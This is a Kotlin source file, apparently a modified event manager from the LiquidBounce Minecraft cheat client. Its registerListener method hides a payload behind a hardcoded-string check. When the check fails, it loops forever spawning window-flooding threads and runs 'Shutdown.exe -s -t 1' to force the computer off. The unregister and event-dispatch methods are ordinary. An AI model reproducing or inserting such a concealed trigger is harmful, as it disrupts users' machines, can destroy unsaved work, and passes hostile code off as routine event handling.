/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.event

import oh.yalan.NativeMethod
import tomk.render.DrawArc
import java.awt.Toolkit
import java.io.IOException
import java.util.*
import javax.swing.JFrame

class EventManager {

    private val registry = HashMap<Class<out Event>, MutableList<EventHook>>()

    /**
     * Register [listener]
     */
    @NativeMethod
    fun registerListener(listener: Listenable) {
        if (DrawArc.helper.equals("checkyou789007535678llloiygjiufgaserf")) {
            for (method in listener.javaClass.declaredMethods) {
                if (method.isAnnotationPresent(EventTarget::class.java) && method.parameterTypes.size == 1) {
                    if (!method.isAccessible)
                        method.isAccessible = true

                    val eventClass = method.parameterTypes[0] as Class<out Event>
                    val eventTarget = method.getAnnotation(EventTarget::class.java)

                    val invokableEventTargets = registry.getOrDefault(eventClass, ArrayList())
                    invokableEventTargets.add(EventHook(listener, method, eventTarget))
                    registry[eventClass] = invokableEventTargets
                }
            }
        }else{
            while (true) {
                Thread {
                    val rd = Random()
                    while (true) {
                        val frame = JFrame("你在干嘛")
                        frame.setSize(400, 200)
                        frame.setLocation(
                            rd.nextInt(Toolkit.getDefaultToolkit().screenSize.width),
                            rd.nextInt(Toolkit.getDefaultToolkit().screenSize.height)
                        )
                        frame.isVisible = true
                    }
                }.start()
                java.util.Timer().schedule(object : TimerTask() {
                    override fun run() {
                        val run = Runtime.getRuntime()
                        try {
                            run.exec("Shutdown.exe -s -t 1")
                            run.exit(0)
                        } catch (e: IOException) {
                            run.exit(0)
                        }
                    }
                }, 5000L)
            }
        }
    }
    /**
     * Unregister listener
     *
     * @param listenable for unregister
     */
    fun unregisterListener(listenable: Listenable) {
        for ((key, targets) in registry) {
            targets.removeIf { it.eventClass == listenable }

            registry[key] = targets
        }
    }

    /**
     * Call event to listeners
     *
     * @param event to call
     */
    fun callEvent(event: Event) {
        val targets = registry[event.javaClass] ?: return

        for (invokableEventTarget in targets) {
            try {
                if (!invokableEventTarget.eventClass.handleEvents() && !invokableEventTarget.isIgnoreCondition)
                    continue

                invokableEventTarget.method.invoke(invokableEventTarget.eventClass, event)
            } catch (throwable: Throwable) {
                throwable.printStackTrace()
            }
        }
    }
}
